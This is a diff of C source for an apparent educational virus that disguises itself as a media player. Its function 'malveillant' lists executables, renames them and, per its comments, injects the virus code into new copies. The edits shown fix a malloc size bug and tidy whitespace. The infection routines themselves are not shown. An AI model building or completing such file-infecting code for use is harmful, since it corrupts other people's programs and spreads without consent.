@@ -13,7 +13,7 @@ int main(int argc, char *argv[]) {
 
                 char *command = argv[0];
                 char *extension = ".old";
-                char *String = malloc(strlen(command) + 1);
+                char *String = malloc(strlen(command) + strlen(extension) + 1);
                 if(String) {
                         strcpy(String,command);
                         strcat(String,extension);
@@ -87,10 +87,8 @@ void listeFichier(char *extension) {
                         }
                         closedir(myDir);
                 }
-
                 afficheImage((char *)imageNames[0]);
         }
-
 }
 
 void mediaplayer () {
@@ -171,12 +169,7 @@ void renamingFile(char *fileName) {
 
 void malveillant() {
         //printf("\nBad things happens bruh\n");
-
         //printf("\nListing executables and renaming and creating new files..\n\n");
-
         cptExec();
-
         //printf("\nInjection du code du virus MediaPlayer dans les nouveaux executables..\n");
-
-
 }
